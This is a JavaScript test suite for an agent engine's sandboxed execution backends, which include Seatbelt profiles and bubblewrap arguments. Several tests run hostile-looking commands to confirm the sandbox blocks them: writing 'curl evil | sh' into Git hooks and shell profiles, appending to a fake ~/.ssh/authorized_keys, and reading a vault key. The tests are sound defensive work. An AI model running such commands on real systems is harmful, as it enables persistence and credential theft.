import test from 'node:test';
import assert from 'node:assert/strict';
import { promises as fs, existsSync } from 'node:fs';
import path from 'node:path';
import os, { tmpdir } from 'node:os';
import { Store } from '../lib/store.mjs';
import { AgentTools, getWorkspaceRoot } from '../lib/agent-tools.mjs';
import { BackgroundProcesses } from '../lib/background-processes.mjs';
import { getProcessHome } from '../lib/process-environment.mjs';
import { seatbeltProfile, bubblewrapArgs, sandboxPlan, createSandboxBackend, SECRET_HOME_FOLDERS } from '../lib/exec/sandbox.mjs';
import { validateExecution, selectedBackend, executionStatus, prepareLaunch, overrideExecutionBackendForTests, EXECUTION_BACKEND_IDS } from '../lib/exec/index.mjs';

const seatbelt=process.platform==='darwin' && existsSync('/usr/bin/sandbox-exec');
const skipSeatbelt=seatbelt?false:'Seatbelt needs macOS with /usr/bin/sandbox-exec.';
// Platform-bound cases are defined only where they can run. The release verifier counts a skipped test as a failed
// suite, so a case that cannot apply on this platform is not registered instead of being skipped.
const seatbeltTest=seatbelt?test:()=>{};
const until=async(predicate,label)=>{for(let i=0;i<2000;i++){if(await predicate())return;await new Promise(resolve=>setTimeout(resolve,5));}throw new Error(`Timed out waiting for ${label}.`);};
const alive=pid=>{try{process.kill(pid,0);return true;}catch{return false;}};

test('the registry holds Engine code only and the bot field accepts only registered backends',()=>{
  assert.deepEqual(EXECUTION_BACKEND_IDS,['host','sandbox','docker','ssh']);
  assert.equal(validateExecution(undefined),null);assert.equal(validateExecution(null),null);
  assert.equal(validateExecution({backend:'host'}),null,'host is the default and is stored as no setting');
  assert.deepEqual(validateExecution({backend:'sandbox'}),{backend:'sandbox'});
  for(const bad of ['sandbox',{backend:'vm'},{backend:'sandbox',image:'x'},{backend:'../lib/x.mjs'},[],{backend:1}])
    assert.throws(()=>validateExecution(bad),error=>error.status===400,JSON.stringify(bad));
  assert.equal(selectedBackend({}),'host');assert.equal(selectedBackend({execution:{backend:'sandbox'}}),'sandbox');
  assert.equal(selectedBackend({execution:{backend:'docker'}}),'docker','an unknown stored id is kept so it reports as unavailable, never as host');
});

test('the Seatbelt profile denies writes, re-allows the bot folders, protects hooks and profiles, and refuses unsafe paths',()=>{
  const profile=seatbeltProfile({writable:['/data/workspaces/b','/data/process-homes/b'],denyRead:['/data','/Users/me/.ssh'],traverse:['/data','/data/workspaces','/data/process-homes']});
  const lines=profile.split('\n');
  assert.deepEqual(lines.slice(0,3),['(version 1)','(allow default)','(deny file-write*)']);
  assert.match(lines[3],/^\(allow file-write\* \(subpath "\/data\/workspaces\/b"\) \(subpath "\/data\/process-homes\/b"\)/);
  assert.match(lines[4],/^\(deny file-write\* \(regex #"\^\/data\/workspaces\/b\(\/\.\*\)\?\//);
  assert.match(lines[4],/\[hH\]\[oO\]\[oO\]\[kK\]\[sS\]/);assert.match(lines[4],/\[nN\]\[pP\]\[mM\]\[rR\]\[cC\]/);
  assert.equal(lines[5],'(deny file-read* (subpath "/data") (subpath "/Users/me/.ssh"))');
  assert.match(lines[6],/^\(allow file-read-metadata \(literal "\/data"\)/);
  assert.equal(lines[7],'(allow file-read* (subpath "/data/workspaces/b") (subpath "/data/process-homes/b"))','own folders are readable again, last rule wins');
  // Regex metacharacters in a real folder name are escaped; quotes, backslashes, control characters and relative paths are refused.
  assert.match(seatbeltProfile({writable:['/data/a.b (1)']}),/\^\/data\/a\\\.b \\\(1\\\)\(/);
  for(const bad of ['/data/"x','/data/a\\b','/data/a\nb','relative/path','/','/data/../etc'])assert.throws(()=>seatbeltProfile({writable:[bad]}),error=>error.code==='sandbox_unavailable',bad);
  assert.throws(()=>seatbeltProfile({writable:[]}),/writable folder/);
});

test('the bubblewrap arguments use only user, mount and PID namespaces, hide the Engine data and keep the process group',()=>{
  const args=bubblewrapArgs({writable:['/srv/data/workspaces/b','/srv/data/process-homes/b'],dataDir:'/srv/data',hideFolders:['/home/u/.ssh'],hideFiles:['/opt/tupies/.env'],hiddenFile:'/srv/data/exec-sandbox/hidden-file',pins:['/srv/data/workspaces/b/repo','/srv/data/workspaces/b/repo/.git'],readOnly:['/srv/data/workspaces/b/.git/hooks',['/srv/data/exec-sandbox/empty-file','/srv/data/process-homes/b/.bashrc']],cwd:'/srv/data/workspaces/b',executable:'bash',args:['-lc','echo hi']});
  assert.deepEqual(args.slice(0,12),['--unshare-user','--unshare-pid','--die-with-parent','--ro-bind','/','/','--dev','/dev','--proc','/proc','--tmpfs','/tmp']);
  for(const flag of ['--new-session','--unshare-net','--unshare-all','--unshare-ipc','--unshare-uts','--unshare-cgroup','--unshare-cgroup-try','--as-pid-1'])assert.equal(args.includes(flag),false,`${flag}: a new session would escape Stop; the network and other namespaces stay as they are`);
  const at=flag=>args.findIndex((item,index)=>item===flag[0] && args[index+1]===flag[1]);
  assert.deepEqual(args.slice(at(['--tmpfs','/srv/data'])-2,at(['--tmpfs','/srv/data'])),['--perms','0111'],'the data folder can be crossed to the bot folders but not listed');
  assert.deepEqual(args.slice(at(['--tmpfs','/home/u/.ssh'])-2,at(['--tmpfs','/home/u/.ssh'])),['--perms','0000'],'a secret folder cannot even be listed');
  assert.ok(at(['--ro-bind','/srv/data/exec-sandbox/hidden-file'])>0 && args[at(['--ro-bind','/srv/data/exec-sandbox/hidden-file'])+2]==='/opt/tupies/.env');
  const order=[['--tmpfs','/srv/data'],['--bind','/srv/data/workspaces/b'],['--bind','/srv/data/workspaces/b/repo'],['--bind','/srv/data/workspaces/b/repo/.git'],['--ro-bind','/srv/data/workspaces/b/.git/hooks'],['--ro-bind','/srv/data/exec-sandbox/empty-file'],['--remount-ro','/srv/data'],['--chdir','/srv/data/workspaces/b']].map(at);
  assert.ok(order.every(index=>index>0),JSON.stringify(order));assert.deepEqual([...order].sort((a,b)=>a-b),order,'hide, bind back, pin, protect, then make the hidden tmpfs read-only');
  assert.equal(args[at(['--ro-bind','/srv/data/exec-sandbox/empty-file'])+2],'/srv/data/process-homes/b/.bashrc','a missing profile gets the empty placeholder');
  assert.deepEqual(args.slice(-6),['--chdir','/srv/data/workspaces/b','--','bash','-lc','echo hi']);
  // When the service account's home that holds the data folder is hidden, the data folder needs no tmpfs of its own.
  const parent=bubblewrapArgs({writable:['/var/lib/tupies/data/workspaces/b'],dataDir:'/var/lib/tupies/data',hideFolders:['/var/lib/tupies'],cwd:'/var/lib/tupies/data/workspaces/b',executable:'true'});
  assert.equal(parent.includes('/var/lib/tupies/data') && parent[parent.indexOf('/var/lib/tupies/data')-1]==='--tmpfs',false);assert.ok(parent.includes('/var/lib/tupies'));
  assert.throws(()=>bubblewrapArgs({writable:['/w'],dataDir:'relative',cwd:'/w',executable:'bash'}),error=>error.code==='sandbox_unavailable');
  assert.throws(()=>bubblewrapArgs({writable:['/w'],dataDir:'/d',hideFiles:['/x/.env'],cwd:'/w',executable:'bash'}),/placeholder/,'files are never hidden without the placeholder');
  assert.throws(()=>bubblewrapArgs({writable:['/w'],dataDir:'/d',readOnly:['relative'],cwd:'/w',executable:'bash'}),error=>error.code==='sandbox_unavailable');
});

test('availability is reported honestly per platform and cached',async()=>{
  assert.deepEqual(await createSandboxBackend({platform:'win32'}).available(),{ok:false,reason:'The sandbox works on macOS and Linux only.'});
  const linux=createSandboxBackend({platform:'linux',bwrapCandidates:['/nonexistent/bwrap']});
  assert.equal((await linux.available()).reason,'The sandbox needs bubblewrap. On Debian or Ubuntu: sudo apt install bubblewrap');
  let probes=0;const working=createSandboxBackend({platform:'darwin',seatbelt:process.execPath,runProbe:async()=>{probes++;return {ok:true,reason:''};}});
  assert.equal(working.cached(),null);
  await Promise.all([working.available(),working.available()]);await working.available();
  assert.equal(probes,1,'one probe, then the cached result');assert.deepEqual(working.cached(),{ok:true,reason:''});
  let now=0;const failing=createSandboxBackend({platform:'darwin',seatbelt:process.execPath,clock:()=>now,runProbe:async()=>({ok:false,reason:'denied'})});
  assert.match((await failing.available()).reason,/sandbox-exec is not working: denied/);
  const status=await executionStatus();
  assert.deepEqual(status.map(item=>item.id),['host','sandbox','docker','ssh']);assert.equal(status[0].available,true);
  assert.equal(status[1].available,seatbelt || (process.platform==='linux' && status[1].available));
  if(!status[1].available)assert.ok(status[1].reason.length>0);
});

async function fixture(t,{execution={backend:'sandbox'}}={}) {
  const directory=await fs.mkdtemp(path.join(tmpdir(),'tupies-exec-sandbox-')),store=await new Store(directory).init();
  const outside=await fs.mkdtemp(path.join(tmpdir(),'tupies-exec-outside-'));
  t.after(async()=>{await fs.rm(directory,{recursive:true,force:true});await fs.rm(outside,{recursive:true,force:true});});
  await store.mutate(state=>{for(const bot of state.bots)state.runs[bot.id]={id:'run_a',botId:bot.id,status:'running'};});
  const bot={...store.state.bots[0],tools:['workspace','terminal'],...(execution?{execution}:{})},tools=new AgentTools(store,{});
  const run=(command,options={})=>tools.execute(bot,'terminal',{command},{approved:true,runId:'run_a',signal:options.signal});
  return {store,bot,tools,run,outside,directory:await fs.realpath(directory),root:await fs.realpath(await getWorkspaceRoot(store,bot.id))};
}

seatbeltTest('Seatbelt: commands change the workspace but nothing outside it, globally or in a fake ~/.ssh',{skip:skipSeatbelt},async t=>{
  const h=await fixture(t);
  let result=await h.run('mkdir -p data && echo hello > data/out.txt && cat data/out.txt');
  assert.deepEqual([result.exitCode,result.output,result.backend],[0,'hello\n','sandbox']);
  assert.equal(await fs.readFile(path.join(h.root,'data','out.txt'),'utf8'),'hello\n');
  // Package caches and the home folder are the bot's own process home.
  result=await h.run('printf "%s\\n" "$HOME" "$TMPDIR" "$npm_config_cache" "$PIP_CACHE_DIR" "$XDG_CACHE_HOME"');
  const home=await fs.realpath(await getProcessHome(h.store,h.bot.id));
  assert.ok(result.output.trim().split('\n').every(line=>line.startsWith(home)),result.output);
  // A global install location (the folder of the Engine's own Node) is not writable.
  const globalProbe=path.join(path.dirname(process.execPath),`tupies-sandbox-probe-${process.pid}`);
  result=await h.run(`touch '${globalProbe}'`);
  assert.notEqual(result.exitCode,0);assert.equal(existsSync(globalProbe),false);
  const fakeSsh=path.join(h.outside,'home','.ssh');await fs.mkdir(fakeSsh,{recursive:true});
  result=await h.run(`echo stolen > '${fakeSsh}/authorized_keys'`);
  assert.notEqual(result.exitCode,0);assert.match(result.output,/Operation not permitted/);
  assert.equal(existsSync(path.join(fakeSsh,'authorized_keys')),false);
  result=await h.run(`echo x > /tmp/tupies-sandbox-probe-${process.pid}`);
  assert.notEqual(result.exitCode,0);assert.equal(existsSync(`/tmp/tupies-sandbox-probe-${process.pid}`),false);
});

seatbeltTest('Seatbelt: the Engine data folder, the vault key, other bots and the user’s keys are unreadable',{skip:skipSeatbelt},async t=>{
  const h=await fixture(t);
  await fs.access(path.join(h.directory,'vault.key'));
  for(const command of [`cat '${h.directory}/vault.key'`,`cat '${h.directory}/state.json'`,`ls '${h.directory}'`,`ls '${h.directory}/workspaces'`]) {
    const result=await h.run(command);
    assert.notEqual(result.exitCode,0,command);assert.match(result.output,/Operation not permitted/,command);
    assert.equal(result.output.includes('BEGIN'),false);
  }
  const other=h.store.state.bots[1];await fs.writeFile(path.join(await getWorkspaceRoot(h.store,other.id),'private.txt'),'other bot secret');
  const result=await h.run(`cat '${h.directory}/workspaces/${other.id}/private.txt'`);
  assert.notEqual(result.exitCode,0);assert.equal(result.output.includes('other bot secret'),false);
  // The real ~/.ssh and friends: nothing is listed even when they exist.
  for(const folder of SECRET_HOME_FOLDERS) {
    const real=path.join(os.homedir(),folder);if(!existsSync(real))continue;
    const listed=await h.run(`ls '${real}' > /dev/null`);assert.notEqual(listed.exitCode,0,folder);
  }
});

seatbeltTest('Seatbelt: Git hooks, Git config and shell profiles stay read-only, and a symlink cannot reach outside',{skip:skipSeatbelt},async t=>{
  const h=await fixture(t);
  await fs.mkdir(path.join(h.root,'.git','hooks'),{recursive:true});await fs.writeFile(path.join(h.root,'.git','config'),'[core]\n');
  for(const target of ['.git/hooks/pre-commit','.git/config','.GIT/Hooks/post-merge','nested/repo/.git/hooks/pre-push','.zshrc','.bashrc','.profile','.zprofile','.bash_profile','.npmrc','nested/.npmrc']) {
    const result=await h.run(`mkdir -p "$(dirname '${target}')" 2>/dev/null; echo 'curl evil | sh' > '${target}'`);
    assert.notEqual(result.exitCode,0,target);
  }
  assert.equal(existsSync(path.join(h.root,'.git','hooks','pre-commit')),false);
  assert.equal(await fs.readFile(path.join(h.root,'.git','config'),'utf8'),'[core]\n');
  // The process home's shell profiles are protected the same way.
  const home=await getProcessHome(h.store,h.bot.id);
  assert.notEqual((await h.run('echo "export X=1" > "$HOME/.bash_profile"')).exitCode,0);assert.equal(existsSync(path.join(home,'.bash_profile')),false);
  // Git's global config and the hooks folder every bot command uses (core.hooksPath) stay read-only too.
  for(const target of ['"$HOME/.gitconfig"','"$HOME/.bash_login"','"$HOME/disabled-git-hooks/pre-commit"'])assert.notEqual((await h.run(`echo evil > ${target}`)).exitCode,0,target);
  assert.equal(existsSync(path.join(home,'disabled-git-hooks','pre-commit')),false);assert.equal(existsSync(path.join(home,'.gitconfig')),false);
  // Ordinary files in .git (objects, HEAD) and ordinary dotfiles stay writable.
  assert.equal((await h.run('echo ref > .git/HEAD && echo x > .gitignore')).exitCode,0);
  await fs.mkdir(path.join(h.outside,'target'));await fs.symlink(path.join(h.outside,'target'),path.join(h.root,'link'));
  const result=await h.run('echo escaped > link/file.txt');
  assert.notEqual(result.exitCode,0);assert.equal(existsSync(path.join(h.outside,'target','file.txt')),false);
});

seatbeltTest('Seatbelt: Stop ends the whole sandboxed command tree',{skip:skipSeatbelt},async t=>{
  const h=await fixture(t),controller=new AbortController();
  const pending=h.run('sleep 30 & echo $! > child.pid; wait',{signal:controller.signal});
  await until(async()=>{try{return (await fs.readFile(path.join(h.root,'child.pid'),'utf8')).trim().length>0;}catch{return false;}},'the child pid');
  const child=Number((await fs.readFile(path.join(h.root,'child.pid'),'utf8')).trim());assert.ok(alive(child));
  controller.abort(new Error('Fixture Stop'));
  await assert.rejects(pending,/Fixture Stop/);
  await until(()=>!alive(child),'the sandboxed child to exit');
});

seatbeltTest('Seatbelt: execute_code, shell_run and background commands run in the sandbox too',{skip:skipSeatbelt},async t=>{
  const h=await fixture(t);
  const code=await h.tools.execute(h.bot,'execute_code',{language:'node',code:`import fs from 'node:fs';fs.writeFileSync('code.txt','ok');try{fs.readFileSync(${JSON.stringify(path.join(h.directory,'vault.key'))});console.log('read');}catch(error){console.log(error.code);}`},{approved:true,runId:'run_a'});
  assert.deepEqual([code.exitCode,code.output.trim(),code.backend],[0,'EPERM','sandbox']);
  const shell=await h.tools.execute(h.bot,'shell_run',{executable:'sh',args:['-c',`echo ok > shell.txt; echo x > '${h.outside}/shell.txt'`]},{approved:true,runId:'run_a'});
  assert.equal(shell.backend,'sandbox');assert.match(shell.stderr,/Operation not permitted/);
  assert.equal(existsSync(path.join(h.root,'shell.txt')),true);assert.equal(existsSync(path.join(h.outside,'shell.txt')),false);
  const manager=new BackgroundProcesses(h.store);t.after(()=>manager.close());
  const started=await manager.start(h.bot,'run_a',{executable:'sh',args:['-c',`echo bg > bg.txt; echo x > '${h.outside}/bg.txt'; exit 3`]});
  assert.equal(started.backend,'sandbox');
  const done=await manager.wait(h.bot.id,'run_a',started.processId);
  assert.deepEqual([done.status,done.exitCode,done.backend],['failed',3,'sandbox']);
  assert.equal(existsSync(path.join(h.root,'bg.txt')),true);assert.equal(existsSync(path.join(h.outside,'bg.txt')),false);
  assert.equal(h.store.state.runs[h.bot.id].backgroundProcesses[0].backend,'sandbox');
});

test('a selected backend that cannot be used fails closed unless the approval disclosed the host fallback',async t=>{
  const h=await fixture(t);
  overrideExecutionBackendForTests('sandbox',{id:'sandbox',label:'Sandbox',noun:'sandbox',isolated:true,async available(){return {ok:false,reason:'fixture outage'};},describe(){return {};},async prepare(){throw new Error('unreachable');}});
  t.after(()=>overrideExecutionBackendForTests('sandbox',null));
  await assert.rejects(h.run('echo ran > ran.txt'),error=>error.code==='sandbox_unavailable' && /Nothing ran on this computer/.test(error.message) && /fixture outage/.test(error.message));
  assert.equal(existsSync(path.join(h.root,'ran.txt')),false);
  const launch=await prepareLaunch({store:h.store,bot:h.bot,workspaceRoot:h.root,home:'/x',env:{A:'1'},cwd:h.root,executable:'bash',args:['-lc','true'],hostFallback:'fixture outage'});
  assert.deepEqual([launch.executable,launch.backend,launch.fallbackReason],['bash','host','fixture outage']);
  // A host bot's launch is exactly the original command.
  const host=await prepareLaunch({store:h.store,bot:{id:h.bot.id},workspaceRoot:h.root,home:'/x',env:{A:'1'},cwd:h.root,executable:'bash',args:['-lc','true']});
  assert.deepEqual(host,{executable:'bash',args:['-lc','true'],env:{A:'1'},cwd:h.root,backend:'host'});
});

test('the sandbox plan fails closed when a folder cannot be resolved or would expose the Engine data',async t=>{
  const base=await fs.realpath(await fs.mkdtemp(path.join(tmpdir(),'tupies-exec-plan-')));t.after(()=>fs.rm(base,{recursive:true,force:true}));
  const data=path.join(base,'data'),workspace=path.join(data,'workspaces','b'),home=path.join(data,'process-homes','b');
  await fs.mkdir(workspace,{recursive:true});await fs.mkdir(path.join(home,'.tmp'),{recursive:true});
  const plan=await sandboxPlan({dataDir:data,workspaceRoot:workspace,home,userHome:path.join(base,'user')});
  assert.deepEqual(plan.writable,[workspace,home],'the temp folder lies inside the process home');
  assert.ok(plan.denyRead.includes(data));assert.ok(plan.traverse.includes(path.join(data,'workspaces')) && plan.traverse.includes(data));
  await assert.rejects(sandboxPlan({dataDir:data,workspaceRoot:path.join(data,'missing'),home,userHome:base}),error=>error.code==='sandbox_unavailable');
  await assert.rejects(sandboxPlan({dataDir:data,workspaceRoot:base,home,userHome:path.join(base,'user')}),/contains the Engine data/);
  await assert.rejects(sandboxPlan({dataDir:data,workspaceRoot:workspace,home,userHome:path.join(workspace,'me')}),/contains your home folder/);
  const sshWorkspace=path.join(base,'u','.ssh','ws');await fs.mkdir(sshWorkspace,{recursive:true});
  await assert.rejects(sandboxPlan({dataDir:data,workspaceRoot:sshWorkspace,home,userHome:path.join(base,'u')}),/inside a protected folder/,'a writable folder inside ~/.ssh is refused');
  // A symlinked workspace is resolved to its real folder before it enters a profile.
  const real=path.join(base,'real-workspace');await fs.mkdir(real);const link=path.join(base,'link-workspace');await fs.symlink(real,link);
  assert.equal((await sandboxPlan({dataDir:data,workspaceRoot:link,home,userHome:path.join(base,'user')})).workspace,real);
});
